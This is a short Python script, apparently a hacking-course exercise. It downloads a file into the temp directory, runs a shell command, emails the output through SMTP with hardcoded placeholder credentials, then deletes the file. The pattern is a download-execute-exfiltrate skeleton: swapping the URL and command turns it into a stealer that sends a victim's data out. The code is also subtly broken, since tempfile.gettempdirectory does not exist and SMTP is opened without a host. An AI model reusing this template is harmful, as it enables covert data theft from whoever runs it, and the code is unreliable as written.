#!/usr/bin/env python

import requests,subprocess, smtplib, tempfile, os

def download(url):
    get_response = requests.get(url)
    print(get_response.content)
    file_name = url.split('/')[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email,password,message):
    server = smtplib.SMTP()
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()


temp_directory = tempfile.gettempdirectory()
os.chdir(temp_directory)
download("https://images.nvidia.com/geforce/sites/default/files-world/geforce-gtx-760-style1.png")
result = subprocess.check_output("ls", shell=True)
send_mail("test@test.com","12345678",result)
os.remove("geforce-gtx-760-style1.png")

